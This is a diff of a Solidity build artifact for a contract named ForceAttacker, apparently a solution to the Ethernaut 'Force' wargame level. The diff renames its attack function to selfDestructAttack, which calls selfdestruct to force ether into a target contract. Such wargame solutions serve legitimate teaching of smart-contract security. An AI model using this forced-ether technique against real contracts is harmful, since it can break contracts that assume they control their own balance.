@@ -13,13 +13,6 @@
     },
     {
       "inputs": [],
-      "name": "attack",
-      "outputs": [],
-      "stateMutability": "nonpayable",
-      "type": "function"
-    },
-    {
-      "inputs": [],
       "name": "force",
       "outputs": [
         {
@@ -32,39 +25,46 @@
       "type": "function"
     },
     {
+      "inputs": [],
+      "name": "selfDestructAttack",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
       "stateMutability": "payable",
       "type": "receive"
     }
   ],
   "bytecode": {
-    "object": "0x608060405234801561001057600080fd5b5060405161015938038061015983398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b60c7806100926000396000f3fe608060405260043610602a5760003560e01c80639e5faafc146035578063a79f26dc14604957600080fd5b36603057005b600080fd5b348015604057600080fd5b5060476083565b005b348015605457600080fd5b506000546067906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b6000546001600160a01b0316fffea2646970667358221220bb28f8d83856a51f17dd061e85741463a2be2111bb9b1e22f995db8a5a5436a164736f6c634300080f0033",
-    "sourceMap": "58:230:67:-:0;;;114:59;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;152:5;:14;;-1:-1:-1;;;;;;152:14:67;-1:-1:-1;;;;;152:14:67;;;;;;;;;;58:230;;14:290:124;84:6;137:2;125:9;116:7;112:23;108:32;105:52;;;153:1;150;143:12;105:52;179:16;;-1:-1:-1;;;;;224:31:124;;214:42;;204:70;;270:1;267;260:12;204:70;293:5;14:290;-1:-1:-1;;;14:290:124:o;:::-;58:230:67;;;;;;",
+    "object": "0x608060405234801561001057600080fd5b5060405161015938038061015983398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b60c7806100926000396000f3fe608060405260043610602a5760003560e01c80637c09ca2e146035578063a79f26dc14604957600080fd5b36603057005b600080fd5b348015604057600080fd5b5060476083565b005b348015605457600080fd5b506000546067906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b6000546001600160a01b0316fffea2646970667358221220bd1408d137ef1067bf3532f64e6c22c21bb9a741d8c01ac5d84bad4c47715c6a64736f6c634300080f0033",
+    "sourceMap": "58:242:39:-:0;;;114:59;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;152:5;:14;;-1:-1:-1;;;;;;152:14:39;-1:-1:-1;;;;;152:14:39;;;;;;;;;;58:242;;14:290:48;84:6;137:2;125:9;116:7;112:23;108:32;105:52;;;153:1;150;143:12;105:52;179:16;;-1:-1:-1;;;;;224:31:48;;214:42;;204:70;;270:1;267;260:12;204:70;293:5;14:290;-1:-1:-1;;;14:290:48:o;:::-;58:242:39;;;;;;",
     "linkReferences": {}
   },
   "deployedBytecode": {
-    "object": "0x608060405260043610602a5760003560e01c80639e5faafc146035578063a79f26dc14604957600080fd5b36603057005b600080fd5b348015604057600080fd5b5060476083565b005b348015605457600080fd5b506000546067906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b6000546001600160a01b0316fffea2646970667358221220bb28f8d83856a51f17dd061e85741463a2be2111bb9b1e22f995db8a5a5436a164736f6c634300080f0033",
-    "sourceMap": "58:230:67:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;179:72;;;;;;;;;;;;;:::i;:::-;;87:20;;;;;;;;;;-1:-1:-1;87:20:67;;;;-1:-1:-1;;;;;87:20:67;;;;;;-1:-1:-1;;;;;178:32:124;;;160:51;;148:2;133:18;87:20:67;;;;;;;179:72;237:5;;-1:-1:-1;;;;;237:5:67;216:28",
+    "object": "0x608060405260043610602a5760003560e01c80637c09ca2e146035578063a79f26dc14604957600080fd5b36603057005b600080fd5b348015604057600080fd5b5060476083565b005b348015605457600080fd5b506000546067906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b6000546001600160a01b0316fffea2646970667358221220bd1408d137ef1067bf3532f64e6c22c21bb9a741d8c01ac5d84bad4c47715c6a64736f6c634300080f0033",
+    "sourceMap": "58:242:39:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;179:84;;;;;;;;;;;;;:::i;:::-;;87:20;;;;;;;;;;-1:-1:-1;87:20:39;;;;-1:-1:-1;;;;;87:20:39;;;;;;-1:-1:-1;;;;;178:32:48;;;160:51;;148:2;133:18;87:20:39;;;;;;;179:84;249:5;;-1:-1:-1;;;;;249:5:39;228:28",
     "linkReferences": {}
   },
   "methodIdentifiers": {
-    "attack()": "9e5faafc",
-    "force()": "a79f26dc"
+    "force()": "a79f26dc",
+    "selfDestructAttack()": "7c09ca2e"
   },
   "ast": {
     "absolutePath": "src\\07-Force\\ForceAttacker.sol",
-    "id": 24664,
+    "id": 22618,
     "exportedSymbols": {
       "ForceAttacker": [
-        24663
+        22617
       ]
     },
     "nodeType": "SourceUnit",
-    "src": "32:256:67",
+    "src": "32:268:39",
     "nodes": [
       {
-        "id": 24635,
+        "id": 22589,
         "nodeType": "PragmaDirective",
-        "src": "32:24:67",
+        "src": "32:24:39",
         "literals": [
           "solidity",
           "^",
@@ -73,20 +73,20 @@
         ]
       },
       {
-        "id": 24663,
+        "id": 22617,
         "nodeType": "ContractDefinition",
-        "src": "58:230:67",
+        "src": "58:242:39",
         "nodes": [
           {
-            "id": 24637,
+            "id": 22591,
             "nodeType": "VariableDeclaration",
-            "src": "87:20:67",
+            "src": "87:20:39",
             "constant": false,
             "functionSelector": "a79f26dc",
             "mutability": "mutable",
             "name": "force",
-            "nameLocation": "102:5:67",
-            "scope": 24663,
+            "nameLocation": "102:5:39",
+            "scope": 22617,
             "stateVariable": true,
             "storageLocation": "default",
             "typeDescriptions": {
@@ -94,10 +94,10 @@
               "typeString": "address"
             },
             "typeName": {
-              "id": 24636,
+              "id": 22590,
               "name": "address",
               "nodeType": "ElementaryTypeName",
-              "src": "87:7:67",
+              "src": "87:7:39",
               "stateMutability": "nonpayable",
               "typeDescriptions": {
                 "typeIdentifier": "t_address",
@@ -107,28 +107,28 @@
             "visibility": "public"
           },
           {
-            "id": 24647,
+            "id": 22601,
             "nodeType": "FunctionDefinition",
-            "src": "114:59:67",
+            "src": "114:59:39",
             "body": {
-              "id": 24646,
+              "id": 22600,
               "nodeType": "Block",
-              "src": "142:31:67",
+              "src": "142:31:39",
               "statements": [
                 {
                   "expression": {
-                    "id": 24644,
+                    "id": 22598,
                     "isConstant": false,
                     "isLValue": false,
                     "isPure": false,
                     "lValueRequested": false,
                     "leftHandSide": {
-                      "id": 24642,
+                      "id": 22596,
                       "name": "force",
                       "nodeType": "Identifier",
                       "overloadedDeclarations": [],
-                      "referencedDeclaration": 24637,
-                      "src": "152:5:67",
+                      "referencedDeclaration": 22591,
+                      "src": "152:5:39",
                       "typeDescriptions": {
                         "typeIdentifier": "t_address",
                         "typeString": "address"
@@ -137,26 +137,26 @@
                     "nodeType": "Assignment",
                     "operator": "=",
                     "rightHandSide": {
-                      "id": 24643,
+                      "id": 22597,
                       "name": "_force",
                       "nodeType": "Identifier",
                       "overloadedDeclarations": [],
-                      "referencedDeclaration": 24639,
-                      "src": "160:6:67",
+                      "referencedDeclaration": 22593,
+                      "src": "160:6:39",
                       "typeDescriptions": {
                         "typeIdentifier": "t_address",
                         "typeString": "address"
                       }
                     },
-                    "src": "152:14:67",
+                    "src": "152:14:39",
                     "typeDescriptions": {
                       "typeIdentifier": "t_address",
                       "typeString": "address"
                     }
                   },
-                  "id": 24645,
+                  "id": 22599,
                   "nodeType": "ExpressionStatement",
-                  "src": "152:14:67"
+                  "src": "152:14:39"
                 }
               ]
             },
@@ -166,18 +166,18 @@
             "name": "",
             "nameLocation": "-1:-1:-1",
             "parameters": {
-              "id": 24640,
+              "id": 22594,
               "nodeType": "ParameterList",
               "parameters": [
                 {
                   "constant": false,
-                  "id": 24639,
+                  "id": 22593,
                   "mutability": "mutable",
                   "name": "_force",
-                  "nameLocation": "134:6:67",
+                  "nameLocation": "134:6:39",
                   "nodeType": "VariableDeclaration",
-                  "scope": 24647,
-                  "src": "126:14:67",
+                  "scope": 22601,
+                  "src": "126:14:39",
                   "stateVariable": false,
                   "storageLocation": "default",
                   "typeDescriptions": {
@@ -185,10 +185,10 @@
                     "typeString": "address"
                   },
                   "typeName": {
-                    "id": 24638,
+                    "id": 22592,
                     "name": "address",
                     "nodeType": "ElementaryTypeName",
-                    "src": "126:7:67",
+                    "src": "126:7:39",
                     "stateMutability": "nonpayable",
                     "typeDescriptions": {
                       "typeIdentifier": "t_address",
@@ -198,27 +198,27 @@
                   "visibility": "internal"
                 }
               ],
-              "src": "125:16:67"
+              "src": "125:16:39"
             },
             "returnParameters": {
-              "id": 24641,
+              "id": 22595,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "142:0:67"
+              "src": "142:0:39"
             },
-            "scope": 24663,
+            "scope": 22617,
             "stateMutability": "nonpayable",
             "virtual": false,
             "visibility": "public"
           },
           {
-            "id": 24658,
+            "id": 22612,
             "nodeType": "FunctionDefinition",
-            "src": "179:72:67",
+            "src": "179:84:39",
             "body": {
-              "id": 24657,
+              "id": 22611,
               "nodeType": "Block",
-              "src": "206:45:67",
+              "src": "218:45:39",
               "statements": [
                 {
                   "expression": {
@@ -226,12 +226,12 @@
                       {
                         "arguments": [
                           {
-                            "id": 24653,
+                            "id": 22607,
                             "name": "force",
                             "nodeType": "Identifier",
                             "overloadedDeclarations": [],
-                            "referencedDeclaration": 24637,
-                            "src": "237:5:67",
+                            "referencedDeclaration": 22591,
+                            "src": "249:5:39",
                             "typeDescriptions": {
                               "typeIdentifier": "t_address",
                               "typeString": "address"
@@ -245,27 +245,27 @@
                               "typeString": "address"
                             }
                           ],
-                          "id": 24652,
+                          "id": 22606,
                           "isConstant": false,
                           "isLValue": false,
                           "isPure": true,
                           "lValueRequested": false,
                           "nodeType": "ElementaryTypeNameExpression",
-                          "src": "229:8:67",
+                          "src": "241:8:39",
                           "typeDescriptions": {
                             "typeIdentifier": "t_type$_t_address_payable_$",
                             "typeString": "type(address payable)"
                           },
                           "typeName": {
-                            "id": 24651,
+                            "id": 22605,
                             "name": "address",
                             "nodeType": "ElementaryTypeName",
-                            "src": "229:8:67",
+                            "src": "241:8:39",
                             "stateMutability": "payable",
                             "typeDescriptions": {}
                           }
                         },
-                        "id": 24654,
+                        "id": 22608,
                         "isConstant": false,
                         "isLValue": false,
                         "isPure": false,
@@ -273,7 +273,7 @@
                         "lValueRequested": false,
                         "names": [],
                         "nodeType": "FunctionCall",
-                        "src": "229:14:67",
+                        "src": "241:14:39",
                         "tryCall": false,
                         "typeDescriptions": {
                           "typeIdentifier": "t_address_payable",
@@ -288,18 +288,18 @@
                           "typeString": "address payable"
                         }
                       ],
-                      "id": 24650,
+                      "id": 22604,
                       "name": "selfdestruct",
                       "nodeType": "Identifier",
                       "overloadedDeclarations": [],
                       "referencedDeclaration": -21,
-                      "src": "216:12:67",
+                      "src": "228:12:39",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_payable_$returns$__$",
                         "typeString": "function (address payable)"
                       }
                     },
-                    "id": 24655,
+                    "id": 22609,
                     "isConstant": false,
                     "isLValue": false,
                     "isPure": false,
@@ -307,50 +307,50 @@
                     "lValueRequested": false,
                     "names": [],
                     "nodeType": "FunctionCall",
-                    "src": "216:28:67",
+                    "src": "228:28:39",
                     "tryCall": false,
                     "typeDescriptions": {
                       "typeIdentifier": "t_tuple$__$",
                       "typeString": "tuple()"
                     }
                   },
-                  "id": 24656,
+                  "id": 22610,
                   "nodeType": "ExpressionStatement",
-                  "src": "216:28:67"
+                  "src": "228:28:39"
                 }
               ]
             },
-            "functionSelector": "9e5faafc",
+            "functionSelector": "7c09ca2e",
             "implemented": true,
             "kind": "function",
             "modifiers": [],
-            "name": "attack",
-            "nameLocation": "188:6:67",
+            "name": "selfDestructAttack",
+            "nameLocation": "188:18:39",
             "parameters": {
-              "id": 24648,
+              "id": 22602,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "194:2:67"
+              "src": "206:2:39"
             },
             "returnParameters": {
-              "id": 24649,
+              "id": 22603,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "206:0:67"
+              "src": "218:0:39"
             },
-            "scope": 24663,
+            "scope": 22617,
             "stateMutability": "nonpayable",
             "virtual": false,
             "visibility": "external"
           },
           {
-            "id": 24662,
+            "id": 22616,
             "nodeType": "FunctionDefinition",
-            "src": "257:29:67",
+            "src": "269:29:39",
             "body": {
-              "id": 24661,
+              "id": 22615,
               "nodeType": "Block",
-              "src": "284:2:67",
+              "src": "296:2:39",
               "statements": []
             },
             "implemented": true,
@@ -359,18 +359,18 @@
             "name": "",
             "nameLocation": "-1:-1:-1",
             "parameters": {
-              "id": 24659,
+              "id": 22613,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "264:2:67"
+              "src": "276:2:39"
             },
             "returnParameters": {
-              "id": 24660,
+              "id": 22614,
               "nodeType": "ParameterList",
               "parameters": [],
-              "src": "284:0:67"
+              "src": "296:0:39"
             },
-            "scope": 24663,
+            "scope": 22617,
             "stateMutability": "payable",
             "virtual": false,
             "visibility": "external"
@@ -383,15 +383,15 @@
         "contractKind": "contract",
         "fullyImplemented": true,
         "linearizedBaseContracts": [
-          24663
+          22617
         ],
         "name": "ForceAttacker",
-        "nameLocation": "67:13:67",
-        "scope": 24664,
+        "nameLocation": "67:13:39",
+        "scope": 22618,
         "usedErrors": []
       }
     ],
     "license": "MIT"
   },
-  "id": 67
+  "id": 39
 }
